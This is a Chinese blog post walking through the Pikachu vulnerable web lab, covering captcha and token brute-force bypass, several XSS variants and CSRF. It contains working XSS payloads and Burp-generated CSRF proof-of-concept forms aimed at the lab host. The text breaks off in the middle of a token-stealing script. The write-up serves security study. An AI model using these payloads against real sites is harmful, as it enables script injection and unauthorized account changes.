<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="暴力破解验证码绕过(on server)抓包多次发送，发现没有爆验证码错误，说明存在验证码重用。  验证码绕过(on client)抓包多次发送，虽然验证码在变，但是同样发现没有爆验证码错误，说明存在验证码重用。   token防爆破？抓包发现token，那么我们就需要在每次爆破的时候放入上一个页面返回给我们的token值。 构造相关的标签  设置线程为1  利用草叉的方式爆破，如果适用集束炸弹会">
<meta property="og:type" content="article">
<meta property="og:title" content="Pikachu 靶场学习">
<meta property="og:url" content="http://example.com/2023/03/27/Web/pikachu/index.html">
<meta property="og:site_name" content="Pursue&#39;s blog">
<meta property="og:description" content="暴力破解验证码绕过(on server)抓包多次发送，发现没有爆验证码错误，说明存在验证码重用。  验证码绕过(on client)抓包多次发送，虽然验证码在变，但是同样发现没有爆验证码错误，说明存在验证码重用。   token防爆破？抓包发现token，那么我们就需要在每次爆破的时候放入上一个页面返回给我们的token值。 构造相关的标签  设置线程为1  利用草叉的方式爆破，如果适用集束炸弹会">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230316205941844.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230316210513540.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230316210529724.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230319200008404.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230319200051527.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230319200205766.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321183457443.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321184130566.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321184259489.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321185151181.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321185243848.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321185524298.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321185624229.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321191812852.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321192607292.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321192538237.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321192800605.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321193147940.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321193434810.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230327160818765.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230327153725215.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230327153738260.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230327154052104.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230327164059622.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230327164912206.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230327173837121.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230319201430101.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230319203159186.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230319203307671.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230319203558781.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230320152228372.png">
<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230320152407223.png">
<meta property="article:published_time" content="2023-03-26T16:00:00.000Z">
<meta property="article:modified_time" content="2023-11-28T13:32:56.810Z">
<meta property="article:author" content="Pursue">
<meta property="article:tag" content="Pikachu">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230316205941844.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Pikachu 靶场学习</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.1.1"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">categories</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://gitee.com/rmrfsad/rmrfsad">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/04/05/iot/CVE-2021-27239/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/03/26/CTF/2023%E9%95%BF%E5%9F%8E%E6%9D%AF%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/03/27/Web/pikachu/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/03/27/Web/pikachu/&text=Pikachu 靶场学习"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/03/27/Web/pikachu/&title=Pikachu 靶场学习"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/03/27/Web/pikachu/&is_video=false&description=Pikachu 靶场学习"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Pikachu 靶场学习&body=Check out this article: http://example.com/2023/03/27/Web/pikachu/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/03/27/Web/pikachu/&title=Pikachu 靶场学习"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/03/27/Web/pikachu/&title=Pikachu 靶场学习"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/03/27/Web/pikachu/&title=Pikachu 靶场学习"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/03/27/Web/pikachu/&title=Pikachu 靶场学习"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/03/27/Web/pikachu/&name=Pikachu 靶场学习&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/03/27/Web/pikachu/&t=Pikachu 靶场学习"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-server"><span class="toc-number">1.1.</span> <span class="toc-text">验证码绕过(on server)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-client"><span class="toc-number">1.2.</span> <span class="toc-text">验证码绕过(on client)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#token%E9%98%B2%E7%88%86%E7%A0%B4%EF%BC%9F"><span class="toc-number">1.3.</span> <span class="toc-text">token防爆破？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">2.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss-get"><span class="toc-number">2.1.</span> <span class="toc-text">反射型xss(get)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="toc-number">2.2.</span> <span class="toc-text">存储型xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8Bxss"><span class="toc-number">2.3.</span> <span class="toc-text">DOM型xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E7%9B%B2%E6%89%93"><span class="toc-number">2.4.</span> <span class="toc-text">xss盲打</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E4%B9%8B%E8%BF%87%E6%BB%A4"><span class="toc-number">2.5.</span> <span class="toc-text">xss之过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E4%B9%8Bhtmlspecialchars"><span class="toc-number">2.6.</span> <span class="toc-text">xss之htmlspecialchars</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E4%B9%8Bhref%E8%BE%93%E5%87%BA"><span class="toc-number">2.7.</span> <span class="toc-text">xss之href输出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E4%B9%8Bjs%E8%BE%93%E5%87%BA"><span class="toc-number">2.8.</span> <span class="toc-text">xss之js输出</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-number">3.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-get"><span class="toc-number">3.1.</span> <span class="toc-text">CSRF(get)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-post"><span class="toc-number">3.2.</span> <span class="toc-text">CSRF(post)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-Token"><span class="toc-number">3.3.</span> <span class="toc-text">CSRF Token</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">4.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#client-check"><span class="toc-number">4.1.</span> <span class="toc-text">client check</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MIME-type"><span class="toc-number">4.2.</span> <span class="toc-text">MIME type</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getimagesize"><span class="toc-number">4.3.</span> <span class="toc-text">getimagesize</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Pikachu 靶场学习
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Pursue</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-03-26T16:00:00.000Z" class="dt-published" itemprop="datePublished">2023-03-27</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Web/">Web</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Pikachu/" rel="tag">Pikachu</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h3><p>抓包多次发送，发现没有爆验证码错误，说明存在验证码重用。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230316205941844.png" alt="image-20230316205941844"></p>
<h3 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h3><p>抓包多次发送，虽然验证码在变，但是同样发现没有爆验证码错误，说明存在验证码重用。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230316210513540.png" alt="image-20230316210513540"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230316210529724.png" alt="image-20230316210529724"></p>
<h3 id="token防爆破？"><a href="#token防爆破？" class="headerlink" title="token防爆破？"></a>token防爆破？</h3><p>抓包发现token，那么我们就需要在每次爆破的时候放入上一个页面返回给我们的token值。</p>
<p>构造相关的标签</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230319200008404.png" alt="image-20230319200008404"></p>
<p>设置线程为1</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230319200051527.png" alt="image-20230319200051527"></p>
<p>利用草叉的方式爆破，如果适用集束炸弹会导致token被破坏，开始爆破</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230319200205766.png" alt="image-20230319200205766"></p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h3><p>直接在输入框中写发现长度不够，直接利用GET在URL里面构造就好。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.pikachu.com/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert(1)%3C/script%3E&amp;submit=submit</span><br></pre></td></tr></table></figure>

<h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>在留言板里面写入js脚本，除非删除，否则每次刷新都会触发漏洞。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321183457443.png" alt="image-20230321183457443"></p>
<h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><p>随便输入看看html页面有什么变化。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321184130566.png" alt="image-20230321184130566"></p>
<p>可以看到这里将我们的输入变成了链接，可以用<code>javascript: </code>伪协议来构造xss。</p>
<blockquote>
<p>“javascript:” 是一种伪协议（pseudo-protocol），它在网页中使用 JavaScript 代码来执行某些操作。当浏览器遇到这种协议时，它会解释其中的 JavaScript 代码，并将其执行在当前页面中。</p>
</blockquote>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321184259489.png" alt="image-20230321184259489"></p>
<h3 id="xss盲打"><a href="#xss盲打" class="headerlink" title="xss盲打"></a>xss盲打</h3><p>先随机输入一个测试xss的语句，看一下前端代码。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321185151181.png" alt="image-20230321185151181"></p>
<p>只能找到一个提示，说是进入后台看一看。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321185243848.png" alt="image-20230321185243848"></p>
<h3 id="xss之过滤"><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a>xss之过滤</h3><p>输入测试语句发现过滤了好多字符。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321185524298.png" alt="image-20230321185524298"></p>
<p>尝试用<code>&lt;img</code>标签构造，发现可以。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321185624229.png" alt="image-20230321185624229"></p>
<h3 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h3><p><code>htmlspecialchars()</code>函数是PHP中的一个内置函数，用于将HTML特殊字符（如&lt;、&gt;、&amp;、”、’等）转换为相应的HTML实体，防止它们被浏览器解释为HTML标签或脚本。</p>
<p>先输入最初始的测试语句看看。<strong>注意这里要查看源代码才能看到哪些字符被转义了，用控制台的查看器是看不到的</strong>。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321191812852.png" alt="image-20230321191812852"></p>
<p>发现将我们的输入转化为了字符串，我们可以使用伪协议来构造。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321192607292.png" alt="image-20230321192607292"></p>
<p>同时，我们也发现了没有过滤单引号，那么我们可以通过闭合构造<code>onclick</code>事件。输入<code>&#39;onclick=&#39;alert(1)</code>即可触发漏洞。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321192538237.png" alt="image-20230321192538237"></p>
<h3 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h3><p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321192800605.png" alt="image-20230321192800605"></p>
<p>发现连单引号也转义了，那我们只能用<code>javascript:</code>伪协议来构造了</p>
<h3 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h3><p>随便输入看一看什么情况。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321193147940.png" alt="image-20230321193147940"></p>
<p>发现了一串js代码。考虑将原有的标签闭合构造。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230321193434810.png" alt="image-20230321193434810"></p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230327160818765.png" alt="image-20230327160818765"></p>
<p>对于出现的这个问题，是由于php版本和Mysql版本不一致导致的，修改MYSQL_ASSOC为MYSQLI_ASSOC。</p>
<h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h3><p>抓一下修改信息的包，发送到CSRF模块。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230327153725215.png" alt="image-20230327153725215"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230327153738260.png" alt="image-20230327153738260"></p>
<p>拿到相关的html页面，我们修改一下信息，然后用同样的浏览器访问（保证cookie一样）。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.<span class="title function_ invoke__">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)&lt;/script&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;http://www.pikachu.com/vul/csrf/csrfget/csrf_get_edit.php&quot;</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;sex&quot;</span> value=<span class="string">&quot;girl&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;phonenum&quot;</span> value=<span class="string">&quot;11111111111&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;add&quot;</span> value=<span class="string">&quot;abcd&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;email&quot;</span> value=<span class="string">&quot;vince&amp;#64;pikachu&amp;#46;com&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit request&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>我们再次登录发现信息已经被修改</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230327154052104.png" alt="image-20230327154052104"></p>
<h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><p>换了一个提交方式，浅浅地改一下html页面就好。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://www.pikachu.com/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>, <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;boy&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;22222222222&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;efgh&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;vince<span class="symbol">&amp;#64;</span>pikachu<span class="symbol">&amp;#46;</span>com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h3><p>使用Token的字段进行防护，想要绕过那就必须要泄露用户的Token值。大致的流程如下：</p>
<ol>
<li>构造XSS使得用户访问CSRF Token修改的页面，同时接收返回的Token。</li>
<li>利用返回的Token值构造数据包实现CSRF</li>
</ol>
<p>抓包修改个人信息的数据包，查看响应页面，发现有Token的值。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230327164059622.png" alt="image-20230327164059622"></p>
<p>接下来我们尝试用js脚本访问该页面并获取Token值。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建XMLHttpRequest对象</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span 